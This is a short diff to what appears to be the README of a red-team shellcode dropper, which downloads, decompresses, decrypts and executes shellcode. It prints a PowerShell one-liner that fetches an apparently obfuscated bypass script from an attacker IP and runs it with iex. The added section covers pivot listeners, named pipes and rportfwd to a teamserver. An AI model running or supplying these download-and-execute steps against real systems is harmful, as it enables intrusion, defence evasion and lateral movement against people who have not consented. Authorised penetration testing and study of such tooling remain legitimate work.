@@ -35,3 +35,7 @@ Shellcode dropper solution will download, decompress, decrypt shellcode and exec
 
 4. Execute the dropper with bypass added
 	- `(New-Object Net.WebClient).DownloadString('http://10.10.14.225:1234/am_obfs.ps1) | iex`
+
+## Pivots
+
+For pivot listeners, you will need to create a new named pipe or TCP profile. You may stage the shellcode on your teamserver. However, you will need to `rportfwd` a jump host to your teamserver.
